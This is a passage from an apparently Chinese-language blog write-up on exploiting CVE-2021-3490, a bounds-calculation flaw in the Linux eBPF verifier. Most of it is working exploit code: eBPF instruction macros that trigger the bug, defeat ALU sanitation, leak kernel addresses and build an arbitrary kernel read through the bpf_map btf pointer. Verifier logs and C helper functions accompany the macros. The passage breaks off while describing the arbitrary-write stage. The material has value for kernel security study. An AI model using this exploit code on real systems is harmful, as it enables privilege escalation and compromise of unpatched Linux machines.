class="number">5f</span>) r2 &amp;= r3</span><br><span class="line"><span class="number">18</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R3_w=invP4294967298 R4_w=i</span><br><span class="line">nvP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* 注意r2中&#123;s32_min_value=1,s32_max_value=0&#125;,证明漏洞已经生效 */</span></span><br><span class="line"><span class="number">18</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line">R0 leaks addr as <span class="keyword">return</span> value</span><br><span class="line">processed <span class="number">18</span> insns (limit <span class="number">1000000</span>) max_states_per_insn <span class="number">0</span> total_states <span class="number">1</span> peak_states <span class="number">1</span> mark_read <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>核心思路参考：<a target="_blank" rel="noopener" href="https://buaq.net/go-167631.html">[漏洞分析] 【CVE-2021-3490】eBPF verifier 32 位边界计算错误漏洞分析与利用 (buaq.net)</a> </p>
<p>利用漏洞构造一个最小边界值为 “1”、最大边界值为 “0” 的寄存器： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VULN_REG    BPF_REG_6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* r3 = 0x100000002 */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* triger the vulnerability */</span>                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>因为 R1~R5 有的时候要用来作为函数参数，所以这里在 R6 上构造</li>
<li>此时 R6 32 位边界值为 <code>[1, 0]</code> ，32位运行时值为 <code>0</code></li>
</ul>
<p>构造运行时为 “1” 但 verifier 确信为 “0” 的寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_VULN_REG(__map_fd)                         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r3, make it [0, 1] under 32 bit */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),   \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                    \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>构造出另一个 32 位边界值为 <code>[0, 1]</code> ，32位运行时值为 <code>0</code> 寄存器 R7</li>
<li>把寄存器 R6 和 R7 相加，得到新的 R6，边界值为 <code>[1, 1]</code> ，32位运行时值为 <code>0</code>，于是便获得了一个运行时为 “0” 但 verifier 认为是 “1” 的寄存器 </li>
<li>如果我们再给 R6 加上 <code>1</code> ，从而使得边界值为 <code>[2, 2]</code> ，但实际上的 32 位值为 <code>1</code></li>
<li>再将 R6 与 <code>1</code> 做 <code>&amp;</code> 运算，从而使得边界值为 <code>[0, 0]</code> ，但实际上的 32 位值为 <code>1</code></li>
<li>最终 verifier 便会认为该寄存器的值变为 “0”，但其实际上的运行时值为 “1”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">36</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">37</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">9223372</span></span><br><span class="line"><span class="number">032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffff</span></span><br><span class="line">ff00000000),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7_w=invP(id=<span class="number">0</span>,smax</span><br><span class="line">_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xfffff</span></span><br><span class="line">fff00000001),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R8_w=map_value(id=</span><br><span class="line"><span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp</span><br><span class="line"><span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r6=&#123;s32_min_value=2,s32_max_value=2&#125;,var_off=(0x2; 0xffffffff00000000) */</span></span><br><span class="line"><span class="number">37</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">38</span>: R0_w=invP0 R6_w=invP0 R7_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_val</span><br><span class="line">ue=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_ma</span><br><span class="line">x_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_</span><br><span class="line">ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r6=0,var_off=(0x0; 0xffffffff00000000) */</span></span><br></pre></td></tr></table></figure>
<p>泄露内核基地址：</p>
<p>对于 <code>BPF_MAP_TYPE_ARRAY</code> 类型 的 map 而言，其 wrapper 为 <code>bpf_array</code> 类型（即 <code>bpf_map</code> 内嵌于该结构体中），数据则直接存放在其内部的 <code>value</code> 数组成员当中，因此在查找元素时我们获得的其实是一个指向 <code>bpf_array</code> 内部的指针 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">	u32 elem_size;</span><br><span class="line">	u32 index_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>因此我们只需要前向读取便能读取到 <code>bpf_map</code>，之后可以通过 <code>bpf_map</code> 的函数表泄露内核地址 </li>
</ul>
<p>理论上我们可以构造寄存器，使 verifier 将负数识别为 “0”，但实际上我们还要突破 ALU Sanitation 的检查：</p>
<ul>
<li>ALU Sanitation 是一个用于运行时动态检测的功能，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足 </li>
<li>核心原理就是在 eBPF 程序中的每一条指令前面都添加上额外的辅助指令</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit - <span class="number">1</span>);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>);</span><br><span class="line"><span class="keyword">if</span> (issrc) &#123;</span><br><span class="line">    *patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);</span><br><span class="line">    insn-&gt;src_reg = BPF_REG_AX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    *patch++ = BPF_ALU64_REG(BPF_AND, off_reg, BPF_REG_AX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>aux-&gt;alu_limit</code> 为当前指针运算范围，初始时为 “0”，与指针所做的常量运算同步</li>
<li>对于减法而言可读范围为 <code>(ptr - alu_limit, ptr]</code>（这里保证了指针的偏移不会为负）</li>
</ul>
<p>由于我们有运行时为 “1”，但 verifier 认为是 “0” 的寄存器，我们可以这样调整范围：</p>
<ul>
<li>构造另外一个同样是运行时值为 “1”，但 verifier 认为是 “0” 的寄存器 R8（可以选择直接将 R6 拷贝给 R8）</li>
<li>令 R7 指向 map 第一个元素的第一个字节 <code>value[0]</code> </li>
<li>将 R7 加上 <code>0x1000</code>（<code>R7 = value[0x1000]</code>，<code>alu_limit = 0x1000</code>）</li>
<li>将 R8 乘上 <code>0x1000</code>（<code>R8 = 0x1000</code>）</li>
<li>执行 <code>R7 -= R8</code>，由于 verifier 认为 R8 为 “0”，因此 <code>alu_limit</code> 保持不变，但 R7 实际上已经指回了 <code>value[0]</code></li>
<li>执行 <code>R7 -= 0x110</code>（<code>R7 = value[-0x110]</code>，<code>alu_limit = 0x1000</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_OPS(__map_fd)                             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),       \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),      \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span></span><br></pre></td></tr></table></figure>
<p>构造任意读 RAA：</p>
<p>现在我们能够读写 <code>bpf_map</code> 中的数据，我们需要注意其中的 <code>btf</code> 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">	u32 key_size;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	u32 max_entries;</span><br><span class="line">	u32 map_flags;</span><br><span class="line">	<span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="keyword">int</span> numa_node;</span><br><span class="line">	u32 btf_key_type_id;</span><br><span class="line">	u32 btf_value_type_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但函数 <code>bpf_map_get_info_by_fd</code> 被调用时，程序会把 <code>bpf_map-&gt;btf.id</code> 拷贝给用户空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">				  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">	u32 info_len = attr-&gt;info.info_len;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">		info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">		info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">		info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">	    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>劫持 <code>bpf_map-&gt;btf</code> 即可完成 RAA：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>     \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* write the value into bpf_map-&gt;btf */</span>             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),            \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前半部分使用相同的方法来绕过 <code>alu_limit</code>，后半部分尝试覆盖 <code>bpf_map-&gt;btf</code>（这里的 0x58 是 <code>btf.id</code> 的偏移）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">read_arbitrary_addr_4_bytes</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        READ_ARBITRARY_ADDR(map_fd, idx),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ret = run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .info.bpf_fd = map_fd,</span><br><span class="line">        .info.info_len = <span class="keyword">sizeof</span>(info),</span><br><span class="line">        .info.info = (<span class="keyword">uint64_t</span>)&amp;info,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    data = info.btf_id;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">read_arbitrary_addr</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data = read_arbitrary_addr_4_bytes(map_fd, <span class="number">2</span>);</span><br><span class="line">    data &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    data += read_arbitrary_addr_4_bytes(map_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造任意写 WAA：</p>
<p>核心思想就是覆盖 <code>bpf_map-&gt;ops</code> 为 <code>bpf_array.value</code>（可控地址），并在 <code>bpf_array.value</code> 上伪造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key</code></p>
